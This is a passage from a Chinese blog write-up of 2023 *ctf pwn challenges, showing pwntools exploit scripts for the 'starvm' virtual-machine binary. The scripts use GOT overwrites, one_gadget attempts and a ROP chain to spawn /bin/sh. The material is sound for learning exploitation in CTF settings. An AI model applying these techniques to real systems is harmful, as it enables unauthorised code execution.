class="number">0x401270</span>, <span class="comment"># 10    reg[0]=0x401270</span></span><br><span class="line">        <span class="number">0</span>, <span class="number">0</span>, <span class="comment"># 7     mallocgot=0x401270</span></span><br><span class="line">        <span class="number">2</span>, <span class="number">1</span>, <span class="comment"># 7     mallocgot高位=0</span></span><br><span class="line">        <span class="number">14</span>, <span class="number">0x4040D0</span>, <span class="comment"># 10 mem=stdin</span></span><br><span class="line">        <span class="number">0</span>, <span class="number">0x4040D8</span>, <span class="comment"># 10    reg[0]=0x4040D8</span></span><br><span class="line">        <span class="number">1</span>, <span class="number">0x6873</span>, <span class="comment"># 10    reg[1]=0x6873 sh</span></span><br><span class="line">        <span class="number">0</span>, <span class="number">0</span>, <span class="comment"># 7     stdinlow=0x4040D8</span></span><br><span class="line">        <span class="number">2</span>, <span class="number">1</span>, <span class="comment"># 7     stdinhigh=0</span></span><br><span class="line">        <span class="number">1</span>, <span class="number">2</span>, <span class="comment"># 7     0x4040D8=0x6873</span></span><br><span class="line">        <span class="number">14</span>, <span class="number">0</span>, <span class="comment"># 10    mem置零</span></span><br><span class="line">        <span class="number">0</span>, <span class="number">0</span>, <span class="comment"># 6        触发malloc</span></span><br><span class="line">        <span class="number">0xdeadbeef</span>]</span><br><span class="line"></span><br><span class="line">sh.sendlineafter(<span class="string">b&#x27;your cost:\n&#x27;</span>, <span class="string">&#x27;\n&#x27;</span>.join([<span class="built_in">str</span>(v) <span class="keyword">for</span> v <span class="keyword">in</span> cost]).encode())</span><br><span class="line"></span><br><span class="line">sh.interactive()</span><br><span class="line">    </span><br></pre></td></tr></table></figure>

<p>由于一开始给了栈地址，就想着修改返回地址为ogg，但是glibc2.35的ogg太难用了，没一个成功</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.clear(arch=<span class="string">&#x27;amd64&#x27;</span>, os=<span class="string">&#x27;linux&#x27;</span> )</span><br><span class="line"></span><br><span class="line">sh=process(<span class="string">&#x27;./starvm&#x27;</span>)</span><br><span class="line"></span><br><span class="line">gdb.attach(sh,<span class="string">&#x27;b *0x00401A38&#x27;</span>)</span><br><span class="line"></span><br><span class="line">cmd = [<span class="number">10</span>,<span class="number">10</span>,<span class="number">6</span>,<span class="number">10</span>,<span class="number">2</span>,<span class="number">7</span>]</span><br><span class="line">sh.recvuntil(<span class="string">b&#x27;at &#x27;</span>)</span><br><span class="line">stack_ret=<span class="built_in">int</span>(sh.recv(<span class="built_in">len</span>(<span class="string">&#x27;7fff3b21f080&#x27;</span>)),<span class="number">16</span>)-(<span class="number">0x7ffd188fa9d0</span>-<span class="number">0x7ffd188fa9e8</span>)</span><br><span class="line"></span><br><span class="line">sh.sendlineafter(<span class="string">b&#x27;command:\n&#x27;</span>, <span class="string">&#x27; &#x27;</span>.join([<span class="built_in">str</span>(v) <span class="keyword">for</span> v <span class="keyword">in</span> cmd]).encode() + <span class="string">b&#x27; 16&#x27;</span>)</span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">10 reg[op1]=op2</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">6  reg[op1]=mem[op2]</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">7 mem[op2]=reg[op1]</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">2 reg[op1]=reg[op1] + reg[op2]</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line">ogg=<span class="number">0xebcf8</span>-<span class="number">0x29d90</span></span><br><span class="line">cost = [<span class="number">14</span>,stack_ret&amp;<span class="number">0xffffffff</span>,</span><br><span class="line">        <span class="number">15</span>,(stack_ret&gt;&gt;<span class="number">32</span>)&amp;<span class="number">0xffffffff</span>,<span class="comment">#修改mem为栈上main的返回地址</span></span><br><span class="line">        <span class="number">0</span>,<span class="number">0</span>,<span class="comment">#6 reg[0]=mem[0]</span></span><br><span class="line">        <span class="number">1</span>,ogg,<span class="comment">#10 reg[op1]=ogg</span></span><br><span class="line">        <span class="number">0</span>,<span class="number">1</span>,<span class="comment">#2 reg[0]=reg[1] + reg[0]</span></span><br><span class="line">        <span class="number">0</span>,<span class="number">0</span>,</span><br><span class="line">        <span class="number">0xdeadbeef</span>]</span><br><span class="line"></span><br><span class="line">sh.sendlineafter(<span class="string">b&#x27;your cost:\n&#x27;</span>, <span class="string">&#x27;\n&#x27;</span>.join([<span class="built_in">str</span>(v) <span class="keyword">for</span> v <span class="keyword">in</span> cost]).encode())</span><br><span class="line"></span><br><span class="line">sh.interactive()</span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">0x50a37 posix_spawn(rsp+0x1c, &quot;/bin/sh&quot;, 0, rbp, rsp+0x60, environ)</span></span><br><span class="line"><span class="string">constraints:</span></span><br><span class="line"><span class="string">  rsp &amp; 0xf == 0</span></span><br><span class="line"><span class="string">  rcx == NULL</span></span><br><span class="line"><span class="string">  rbp == NULL || (u16)[rbp] == NULL</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">0xebcf1 execve(&quot;/bin/sh&quot;, r10, [rbp-0x70])</span></span><br><span class="line"><span class="string">constraints:</span></span><br><span class="line"><span class="string">  address rbp-0x78 is writable</span></span><br><span class="line"><span class="string">  [r10] == NULL || r10 == NULL</span></span><br><span class="line"><span class="string">  [[rbp-0x70]] == NULL || [rbp-0x70] == NULL</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">0xebcf5 execve(&quot;/bin/sh&quot;, r10, rdx)</span></span><br><span class="line"><span class="string">constraints:</span></span><br><span class="line"><span class="string">  address rbp-0x78 is writable</span></span><br><span class="line"><span class="string">  [r10] == NULL || r10 == NULL</span></span><br><span class="line"><span class="string">  [rdx] == NULL || rdx == NULL</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">0xebcf8 execve(&quot;/bin/sh&quot;, rsi, rdx)</span></span><br><span class="line"><span class="string">constraints:</span></span><br><span class="line"><span class="string">  address rbp-0x78 is writable</span></span><br><span class="line"><span class="string">  [rsi] == NULL || rsi == NULL</span></span><br><span class="line"><span class="string">  [rdx] == NULL || rdx == NULL</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br></pre></td></tr></table></figure>

<p>有个syscal ret的gadget做后门可以写rop链</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.clear(arch=<span class="string">&#x27;amd64&#x27;</span>, os=<span class="string">&#x27;linux&#x27;</span> )</span><br><span class="line"></span><br><span class="line">sh=process(<span class="string">&#x27;./starvm&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># gdb.attach(sh,&#x27;b *0x40198B&#x27;)</span></span><br><span class="line">gdb.attach(sh,<span class="string">&#x27;b *0x401325&#x27;</span>)</span><br><span class="line"></span><br><span class="line">cmd = [<span class="number">10</span>,<span class="number">10</span>,<span class="number">10</span>,<span class="number">7</span>,<span class="number">7</span>,<span class="number">7</span>,<span class="number">7</span>,<span class="number">10</span>,<span class="number">7</span>,<span class="number">7</span>,<span class="number">10</span>,<span class="number">7</span>,<span class="number">10</span>,<span class="number">7</span>,<span class="number">10</span>,<span class="number">7</span>,<span class="number">7</span>,<span class="number">10</span>,<span class="number">7</span>,<span class="number">7</span>,<span class="number">10</span>,<span class="number">7</span>,<span class="number">7</span>,<span class="number">10</span>,<span class="number">7</span>,<span class="number">7</span>,<span class="number">10</span>,<span class="number">7</span>,<span class="number">10</span>,<span class="number">7</span>]</span><br><span class="line">sh.recvuntil(<span class="string">b&#x27;at &#x27;</span>)</span><br><span class="line">stack_ret=<span class="built_in">int</span>(sh.recv(<span class="built_in">len</span>(<span class="string">&#x27;7fff3b21f080&#x27;</span>)),<span class="number">16</span>)-(<span class="number">0x7ffd188fa9d0</span>-<span class="number">0x7ffd188fa9e8</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(stack_ret))</span><br><span class="line"><span class="comment"># pause()</span></span><br><span class="line">sh.sendlineafter(<span class="string">b&#x27;command:\n&#x27;</span>, <span class="string">&#x27; &#x27;</span>.join([<span class="built_in">str</span>(v) <span class="keyword">for</span> v <span class="keyword">in</span> cmd]).encode() + <span class="string">b&#x27; 16&#x27;</span>)</span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">10 reg[op1]=op2</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">6  reg[op1]=mem[op2]</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">3 reg[op1]=reg[op1] - reg[op2]</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">7 mem[op2]=reg[op1]</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">2 reg[op1]=reg[op1] + reg[op2]</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line">pop_rax=<span class="number">0x0000000000401468</span></span><br><span class="line">xorrdx=<span class="number">0x0000000000401464</span></span><br><span class="line">pop_rdi=<span class="number">0x00000000004017cb</span></span><br><span class="line">poprsi=<span class="number">0x00000000004016f0</span></span><br><span class="line">syscall=<span class="number">0x000000000040146a</span></span><br><span class="line">ogg=<span class="number">0xebcf8</span>-<span class="number">0x29d90</span></span><br><span class="line">sh_str=stack_ret+<span class="number">0x40</span></span><br><span class="line">cost = [<span class="number">14</span>,stack_ret&amp;<span class="number">0xffffffff</span>,</span><br><span class="line">        <span class="number">15</span>,(stack_ret&gt;&gt;<span class="number">32</span>)&amp;<span class="number">0xffffffff</span>,</span><br><span class="line">        <span class="number">0</span>,poprsi,<span class="comment">#10</span></span><br><span class="line">        <span class="number">0</span>,<span class="number">0</span>,<span class="comment">#7</span></span><br><span class="line">        <span class="number">9</span>,<span class="number">1</span>, <span class="comment">#7  pop rsi</span></span><br><span class="line">        <span class="number">9</span>,<span class="number">2</span>,<span class="comment">#7</span></span><br><span class="line">        <span class="number">9</span>,<span class="number">3</span>,<span class="comment">#7  0</span></span><br><span class="line">        </span><br><span class="line">        <span class="number">0</span>,pop_rdi,<span class="comment">#10</span></span><br><span class="line">        <span class="number">0</span>,<span class="number">4</span>,<span class="comment">#7</span></span><br><span class="line">        <span class="number">9</span>,<span class="number">5</span>, <span class="comment">#7 pop rdi</span></span><br><span class="line">        <span class="number">0</span>,sh_str&amp;<span class="number">0xffffffff</span>,<span class="comment">#10</span></span><br><span class="line">        <span class="number">0</span>,<span class="number">6</span>,<span class="comment">#7</span></span><br><span class="line">        <span class="number">0</span>,(sh_str&gt;&gt;<span class="number">32</span>)&amp;<span class="number">0xffffffff</span>,<span class="comment">#10</span></span><br><span class="line">        <span class="number">0</span>,<span class="number">7</span>,<span class="comment">#7</span></span><br><span class="line">        </span><br><span class="line">        <span class="number">0</span>,xorrdx,<span class="comment">#10</span></span><br><span class="line">        <span class="number">0</span>,<span class="number">8</span>,<span class="comment">#7</span></span><br><span class="line">        <span class="number">9</span>,<span class="number">9</span>, <span class="comment">#7 xorrdx</span></span><br><span class="line">        </span><br><span class="line">        <span class="number">0</span>,pop_rax,<span class="comment">#10</span></span><br><span class="line">        <span class="number">0</span>,<span class="number">10</span>,<span class="comment">#7</span></span><br><span class="line">        <span class="number">9</span>,<span class="number">11</span>,<span class="comment">#7 pop rax</span></span><br><span class="line">        </span><br><span class="line">        <span class="number">0</span>,<span class="number">0x3b</span>,<span class="comment">#10</span></span><br><span class="line">        <span class="number">0</span>,<span class="number">12</span>,<span class="comment">#7</span></span><br><span class="line">        <span class="number">9</span>,<span class="number">13</span>,<span class="comment">#7  0x3b</span></span><br><span class="line">        </span><br><span class="line">        <span class="number">0</span>,syscall,<span class="comment">#10</span></span><br><span class="line">        <span class="number">0</span>,<span class="number">14</span>,<span class="comment">#7</span></span><br><span class="line">        <span class="number">9</span>,<span class="number">15</span>, <span class="comment">#7 syscall</span></span><br><span class="line">        <span class="number">0</span>,<span class="number">0x6e69622f</span>, <span class="comment">#10</span></span><br><span class="line">        <span class="number">0</span>,<span class="number">16</span>,<span class="comment">#7</span></span><br><span class="line">        <span class="number">0</span>,<span class="number">0x68732f</span>, <span class="comment">#10 </span></span><br><span class="line">        <span class="number">0</span>,<span class="number">17</span>,<span class="comment">#7</span></span><br><span class="line">        </span><br><span class="line">        <span class="number">0xdeadbeef</span>]</span><br><span class="line">sh.sendlineafter(<span class="string">b&#x27;your cost:\n&#x27;</span>, <span class="string">&#x27;\n&#x27;</span>.join([<span class="built_in">str</span>(v) <span class="keyword">for</span> v <span class="keyword">in</span> cost]).encode())</span><br><span class="line"></span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>

<h2 id="drop"><a href="#drop" class="headerlink" title="drop"></a>drop</h2>
  </div>
</article>



        
          <div id="footer-post-container">
  <div id="footer-post">

    <div id="nav-footer" style="display: none">
      <ul>
         
          <li><a href="/">Home</a></li>
         
          <li><a href="/archives/">Writing</a></li>
         
          <li><a href="/search/">Search</a></li>
         
          <li><a href="/tags/">Tag</a></li>
         
          <li><a href="/about/">About</a></li>
        
      </ul>
    </div>

    <div id="toc-footer" style="display: none">
      <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#fcalc"><span class="toc-number">1.</span> <span class="toc-text">fcalc</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%96%B9%E6%B3%952"><span class="toc-number">1.1.</span> <span class="toc-text">方法2</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%96%B9%E6%B3%953"><span class="toc-number">1.2.</span> <span class="toc-text">方法3</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#starvm"><span class="toc-number">2.</span> <span class="toc-text">starvm</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#drop"><span class="toc-number">3.</span> <span class="toc-text">drop</span></a></li></ol>
    </div>

    <div id="share-footer" style="display: none">
      <ul>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://grxer.gitee.io/2023/08/02/startctf/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://grxer.gitee.io/2023/08/02/startctf/&text=2023 *ctf pwn"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://grxer.gitee.io/2023/08/02/startctf/&title=2023 *ctf pwn"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://grxer.gitee.io/2023/08/02/startctf/&is_video=false&description=2023 *ctf pwn"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="mailto:?subject=2023 *ctf pwn&body=Check out this article: https://grxer.gitee.io/2023/08/02/startctf/"><i class="fas fa-envelope fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://grxer.gitee.io/2023/08/02/startctf/&title=2023 *ctf pwn"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://grxer.gitee.io/2023/08/02/startctf/&title=2023 *ctf pwn"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://grxer.gitee.io/2023/08/02/startctf/&title=2023 *ctf pwn"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://grxer.gitee.io/2023/08/02/startctf/&title=2023 *ctf pwn"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://grxer.gitee.io/2023/08/02/startctf/&name=2023 *ctf pwn&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://grxer.gitee.io/2023/08/02/startctf/&t=2023 *ctf pwn"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
</ul>

    </div>

    <div id="actions-footer">
        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fas fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
        <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fas fa-list fa-lg" aria-hidden="true"></i> TOC</a>
        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fas fa-share-alt fa-lg" aria-hidden="true"></i> Share</a>
        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
    </div>

  </div>
</div>

        
        <footer id="footer">
  <div class="footer-left">
    Copyright &copy;
    
    
    2023
    bxz
  </div>
  <div class="footer-right">
    <nav>
      <ul>
        <!--
       --><li><a href="/">Home</a></li><!--
     --><!--
       --><li><a href="/archives/">Writing</a></li><!--
     --><!--
       --><li><a href="/search/">Search</a></li><!--
     --><!--
       --><li><a href="/tags/">Tag</a></li><!--
     --><!--
       --><li><a href="/about/">About</a></li><!--
     -->
      </ul>
    </nav>
  </div>
</footer>

    </div>
    <!-- styles -->



  <link rel="preload" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.2/css/all.min.css" crossorigin="anonymous" onload="this.onload=null;this.rel='stylesheet'"/>


    <!-- jquery -->
 
  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" crossorigin="anonymous"></script> 




<!-- clipboard -->

  
    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.7/clipboard.min.js" crossorigin="anonymous"></script> 
  
  <script type="text/javascript">
  $(function() {
    // copy-btn HTML
    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"Copy to clipboard!\">";
    btn += '<i class="far fa-clone"></i>';
    btn += '</span>'; 
    // mount it!
    $(".highlight table").before(btn);
    var clip = new ClipboardJS('.btn-copy', {
      text: function(trigger) {
        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
      }
    });
    clip.on('success', function(e) {
      e.trigger.setAttribute('aria-label', "Copied!");
      e.clearSelection();
    })
  })
  </script>


<script src="/js/main.js"></script>

<!-- search -->

<!-- Google Analytics -->

<!-- Baidu Analytics -->

  <script type="text/javascript">
        var _hmt = _hmt || [];
        (function() {
          var hm = document.createElement("script");
          hm.src = "https://hm.baidu.com/hm.js?a22ef0bec4e4a9c7337bea6e37ff55c1";
          var s = document.getElementsByTagName("script")[0];
          s.parentNode.insertBefore(hm, s);
        })();
        </script>

<!-- Cloudflare Analytics -->

<!-- Umami Analytics -->

<!-- Disqus Comments -->

<!-- utterances Comments -->

</body>
</html>
